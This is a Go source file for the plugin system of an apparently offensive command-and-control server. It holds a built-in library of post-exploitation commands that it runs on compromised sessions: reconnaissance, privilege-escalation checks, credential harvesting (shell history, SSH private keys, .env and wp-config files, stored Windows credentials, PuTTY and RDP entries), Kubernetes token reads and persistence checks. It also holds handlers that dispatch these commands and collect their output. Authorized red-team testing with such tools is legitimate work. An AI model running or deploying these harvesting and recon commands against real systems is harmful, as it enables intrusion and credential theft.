package server

// c2_plugins.go — C2 插件系统（CS 后渗透动作库）：插件 = 一组命令模板，
// 一键在目标机逐条执行并聚合回显。内置常用插件（信息收集/提权检测/凭据搜集/
// 容器逃逸检测/网络指纹/痕迹排查）+ 用户自定义（c2_plugins 表）。
// 执行引擎：每条命令 c2Task exec → 轮询 output（600ms，单条上限 25s）。

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/Autumn-27/artex/c2client"
)

// c2BuiltinPlugins 内置插件库（name 唯一，commands ≤ 10 条）。
var c2BuiltinPlugins = []map[string]any{
	{
		"name": "信息收集", "builtin": true,
		"description": "主机身份 / 网络 / 计划任务 / 环境变量全貌",
		"commands": []string{
			"id && uname -a && hostname",
			"ip a 2>/dev/null || ifconfig",
			"netstat -antp 2>/dev/null | head -30 || netstat -an | head -30",
			"ps aux --sort=-%cpu 2>/dev/null | head -15 || tasklist",
			"crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null | grep -v '^#'",
			"env | head -25",
		},
		"commands_win": []string{
			"whoami && hostname",
			"ipconfig /all",
			"netstat -ano | findstr LISTENING",
			"tasklist /FO CSV /NH",
			"net user && net localgroup administrators",
			"set | findstr /I \"PATH COMPUTERNAME USERDOMAIN\"",
		},
	},
	{
		"name": "提权检测", "builtin": true,
		"description": "SUID / sudo / capabilities / 可写敏感路径",
		"commands": []string{
			"sudo -n -l 2>&1 | head -10",
			"find / -perm -4000 -type f 2>/dev/null | head -20",
			"getcap -r / 2>/dev/null | head -10",
			"ls -la /etc/passwd /etc/shadow /etc/sudoers 2>&1",
			"find /etc /opt /tmp -maxdepth 2 -writable -type f 2>/dev/null | head -10",
		},
		"commands_win": []string{
			"whoami /groups | findstr /I \"S-1-5-32-544 S-1-16\"",
			"net session 2>nul && echo IS_ADMIN || echo NOT_ADMIN",
			"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul",
			"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul",
			"wmic service get name,pathname,startmode | findstr /v /i \"system32\"",
			"qwinsta 2>nul",
		},
	},
	{
		"name": "凭据搜集", "builtin": true,
		"description": "history / SSH 密钥 / 配置文件（授权范围内）",
		"commands": []string{
			"cat ~/.bash_history 2>/dev/null | tail -30",
			"ls -la ~/.ssh 2>/dev/null && head -3 ~/.ssh/id_rsa 2>/dev/null",
			"find / -maxdepth 3 \\( -name '.env' -o -name 'config.php' -o -name 'wp-config.php' -o -name 'database.yml' \\) 2>/dev/null | head -10",
			"grep -rE 'password|passwd|secret|api_key' /home/*/.*rc /home/*/.profile 2>/dev/null | head -10",
		},
		"commands_win": []string{
			"cmdkey /list",
			"reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions 2>nul",
			"reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\" 2>nul",
			"dir /s /b %USERPROFILE%\\.ssh 2>nul",
			"ps:$h=$env:APPDATA+'\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'; if(Test-Path $h){Get-Content $h -Tail 30}",
			"net share & net use",
		},
	},
	{
		"name": "容器与 K8s 检测", "builtin": true,
		"description": "docker sock / cgroup / K8s ServiceAccount（逃逸面评估）",
		"commands": []string{
			"ls -la /var/run/docker.sock 2>&1; ls /.dockerenv 2>/dev/null && echo IN_DOCKER",
			"head -3 /proc/1/cgroup 2>/dev/null",
			"ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && head -c 40 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
			"env | grep -iE 'k8s|kube|container' | head -10",
			"which kubectl docker podman 2>/dev/null",
		},
		"commands_win": []string{
			"docker version 2>nul && docker ps 2>nul",
			"kubectl get pods 2>nul & kubectl config current-context 2>nul",
			"set | findstr /I \"KUBE DOCKER CONTAINER\"",
			"dir /b \\.\\pipe\\docker_engine 2>nul && echo DOCKER_PIPE",
			"tasklist /FO CSV /NH | findstr /I \"docker kubelet containerd\"",
		},
	},
	{
		"name": "网络指纹", "builtin": true,
		"description": "hosts / 路由 / DNS / 内网存活段推断",
		"commands": []string{
			"cat /etc/hosts; echo ---; cat /etc/resolv.conf",
			"ip route 2>/dev/null || route -n",
			"ss -s 2>/dev/null || netstat -s | head -10",
			"arp -a 2>/dev/null | head -15 || cat /proc/net/arp | head -15",
		},
		"commands_win": []string{
			"type C:\\Windows\\System32\\drivers\\etc\\hosts",
			"route print -4",
			"arp -a",
			"ipconfig /displaydns | findstr /I \"记录名称 Record Name\" | more +1",
			"netstat -s | findstr /I \"Errors Discards\" | more +0",
		},
	},
	{
		"name": "痕迹排查", "builtin": true,
		"description": "持久化点检查（systemd / 计划任务 / 自启动）",
		"commands": []string{
			"systemctl --user list-units --type=service 2>/dev/null | head -15",
			"ls -la ~/.config/systemd/user/ 2>/dev/null",
			"ls -la /etc/systemd/system/ 2>/dev/null | head -15",
			"ls -la /etc/init.d/ 2>/dev/null | head -15",
			"w && last -10 2>/dev/null",
		},
		"commands_win": []string{
			"schtasks /query /fo CSV /NH | findstr /I \"FORANG\" & echo --- & schtasks /query /fo LIST | more +1",
			"dir /b \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" 2>nul",
			"dir /b \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\" 2>nul",
			"wmic startup get caption,command 2>nul",
			"net user & net localgroup",
			"query user 2>nul & qwinsta 2>nul",
		},
	},
}

// seedC2Plugins 幂等种子内置插件（含 Windows 命令集）。
func (s *Server) seedC2Plugins() {
	_, _ = s.m.PG().Exec(`ALTER TABLE c2_plugins ADD COLUMN IF NOT EXISTS commands_win TEXT`)
	for _, p := range c2BuiltinPlugins {
		cmds, _ := json.Marshal(p["commands"])
		// ps: 前缀行转 -EncodedCommand（$ 变量安全）
		winRaw, _ := p["commands_win"].([]string)
		winOut := make([]string, 0, len(winRaw))
		for _, c := range winRaw {
			if strings.HasPrefix(c, "ps:") {
				winOut = append(winOut, psOneLiner(strings.TrimPrefix(c, "ps:")))
				continue
			}
			winOut = append(winOut, c)
		}
		wcmds, _ := json.Marshal(winOut)
		_, _ = s.m.PG().Exec(`INSERT INTO c2_plugins (name, description, commands, commands_win, builtin)
			VALUES ($1,$2,$3,$4,true)
			ON CONFLICT (name) DO UPDATE SET commands_win=$4 WHERE c2_plugins.builtin`,
			p["name"], p["description"], string(cmds), string(wcmds))
	}
}

// GET /api/tools/c2/plugins — 列表（内置+自定义）。
func (s *Server) c2PluginsList(w http.ResponseWriter, r *http.Request) {
	rows, err := s.m.PG().Query(`SELECT id, name, COALESCE(description,''), commands, COALESCE(commands_win,''), builtin
		FROM c2_plugins ORDER BY builtin DESC, id`)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	defer rows.Close()
	type item struct {
		ID          int64           `json:"id"`
		Name        string          `json:"name"`
		Description string          `json:"description"`
		Commands    json.RawMessage `json:"commands"`
		CommandsWin json.RawMessage `json:"commands_win,omitempty"`
		Builtin     bool            `json:"builtin"`
	}
	out := []item{}
	for rows.Next() {
		var it item
		var cmds, wcmds []byte
		if err := rows.Scan(&it.ID, &it.Name, &it.Description, &cmds, &wcmds, &it.Builtin); err != nil {
			continue
		}
		it.Commands = json.RawMessage(cmds)
		if len(wcmds) > 4 {
			it.CommandsWin = json.RawMessage(wcmds)
		}
		out = append(out, it)
	}
	writeJSON(w, 200, map[string]any{"data": out})
}

// POST /api/tools/c2/plugins — 自定义插件。
func (s *Server) c2PluginsCreate(w http.ResponseWriter, r *http.Request) {
	var b struct {
		Name        string   `json:"name"`
		Description string   `json:"description"`
		Commands    []string `json:"commands"`
		CommandsWin []string `json:"commands_win"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	if strings.TrimSpace(b.Name) == "" || len(b.Commands) == 0 {
		writeErr(w, 400, "name 与 commands 必填")
		return
	}
	if len(b.Commands) > 10 {
		writeErr(w, 400, "命令数上限 10 条")
		return
	}
	cmds, _ := json.Marshal(b.Commands)
	wcmds, _ := json.Marshal(b.CommandsWin)
	var id int64
	err := s.m.PG().QueryRow(`INSERT INTO c2_plugins (name, description, commands, commands_win, builtin)
		VALUES ($1,$2,$3,$4,false) ON CONFLICT (name) DO UPDATE SET
		description=$2, commands=$3, commands_win=$4 RETURNING id`,
		strings.TrimSpace(b.Name), truncateStr(b.Description, 300), string(cmds), string(wcmds)).Scan(&id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true, "id": id})
}

// DELETE /api/tools/c2/plugins/{id} — 仅可删自定义。
func (s *Server) c2PluginsDelete(w http.ResponseWriter, r *http.Request) {
	id := parseID(r.PathValue("id"))
	if id <= 0 {
		writeErr(w, 400, "bad id")
		return
	}
	if _, err := s.m.PG().Exec("DELETE FROM c2_plugins WHERE id=$1 AND NOT builtin", id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// POST /api/tools/c2/plugin/run — 执行插件：逐条下发+取回，聚合返回。
func (s *Server) c2PluginRun(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
		PluginID  int64  `json:"plugin_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	if b.SessionID == "" || b.PluginID <= 0 {
		writeErr(w, 400, "session_id 与 plugin_id 必填")
		return
	}
	var name string
	var cmds, wcmds []byte
	var builtin bool
	if err := s.m.PG().QueryRow(`SELECT name, commands, COALESCE(commands_win,''), builtin FROM c2_plugins WHERE id=$1`, b.PluginID).
		Scan(&name, &cmds, &wcmds, &builtin); err != nil {
		writeErr(w, 404, "插件不存在")
		return
	}
	var commands []string
	if s.c2IsWin(r.Context(), b.SessionID) && len(wcmds) > 4 {
		_ = json.Unmarshal(wcmds, &commands)
	}
	if len(commands) == 0 {
		if err := json.Unmarshal(cmds, &commands); err != nil || len(commands) == 0 {
			writeErr(w, 500, "插件命令解析失败")
			return
		}
	}
	cli := c2client.New(c2client.CurrentOrDefault())
	type step struct {
		Cmd    string `json:"cmd"`
		Output string `json:"output"`
		Error  string `json:"error,omitempty"`
		MS     int64  `json:"ms"`
	}
	steps := make([]step, 0, len(commands))
	for _, cmd := range commands {
		st := step{Cmd: cmd}
		start := time.Now()
		out, err := c2RunTaskWait(r.Context(), cli, b.SessionID, "exec",
			map[string]any{"cmd": cmd}, 25*time.Second)
		st.MS = time.Since(start).Milliseconds()
		if err != nil {
			st.Error = err.Error()
		} else {
			st.Output = truncateStr(out, 60000)
		}
		steps = append(steps, st)
	}
	// 插件动作入图（聚合摘要：成功数/首条输出）
	okCnt := 0
	var first string
	for _, st := range steps {
		if st.Error == "" {
			okCnt++
			if first == "" {
				first = st.Output
			}
		}
	}
	s.c2Audit(b.SessionID, "", "plugin_run", name)
	s.c2GraphAction(b.SessionID, "plugin", "插件 "+name+fmt.Sprintf("（%d/%d 条成功）", okCnt, len(steps)), truncateStr(first, 1200), okCnt > 0)
	writeJSON(w, 200, map[string]any{"data": map[string]any{"plugin": name, "steps": steps}})
}

// c2RunTaskWait 下发任务并轮询到 output/终态（通用引擎，插件与未来功能共用）。
func c2RunTaskWait(ctx context.Context, cli *c2client.Client, sessionID, taskType string, args map[string]any, timeout time.Duration) (string, error) {
	tid, err := cli.EnqueueTask(ctx, sessionID, taskType, args)
	if err != nil {
		return "", err
	}
	if tid == "" {
		return "", fmt.Errorf("服务端未返回 taskId")
	}
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		case <-time.After(600 * time.Millisecond):
		}
		tasks, err := cli.ListTasks(ctx, sessionID, nil)
		if err != nil {
			continue
		}
		for _, it := range tasks {
			m, ok := it.(map[string]any)
			if !ok {
				continue
			}
			id, _ := m["id"].(string)
			if id != tid {
				continue
			}
			if out, _ := m["output"].(string); out != "" {
				return out, nil
			}
			if st, _ := m["status"].(string); st == "done" || st == "completed" || st == "failed" || st == "error" {
				if e, _ := m["error"].(string); e != "" {
					return "", fmt.Errorf("%s", e)
				}
				return "", nil // 终态无输出
			}
		}
	}
	return "", fmt.Errorf("超时未回显（%.0fs）", timeout.Seconds())
}
